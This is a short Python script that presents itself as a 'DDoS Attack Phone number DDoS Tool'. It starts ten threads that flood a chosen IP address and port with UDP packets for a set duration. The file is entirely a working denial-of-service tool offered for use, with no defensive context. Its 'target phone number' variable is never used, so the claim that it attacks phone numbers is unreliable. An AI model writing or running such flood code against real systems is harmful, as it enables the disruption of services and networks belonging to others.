# DDoS Attack Phone number DDoS Tool
import socket
import threading
import time

class DDoSTool:
    def __init__(self, target_ip, target_port, message, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.message = message
        self.duration = duration
        self.end_time = time.time() + duration

    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < self.end_time:
            sock.sendto(self.message.encode(), (self.target_ip, self.target_port))

    def start_attack(self):
        threads = []
        for _ in range(10):  # Number of threads
            thread = threading.Thread(target=self.udp_flood)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    target_number = "1234567890"  # Replace with the target phone number
    target_ip = "192.168.1.1"  # Replace with the target IP
    target_port = 80  # Replace with the target port
    message = "Spam Message"
    duration = 60  # Duration in seconds

    ddos_tool = DDoSTool(target_ip, target_port, message, duration)
    ddos_tool.start_attack()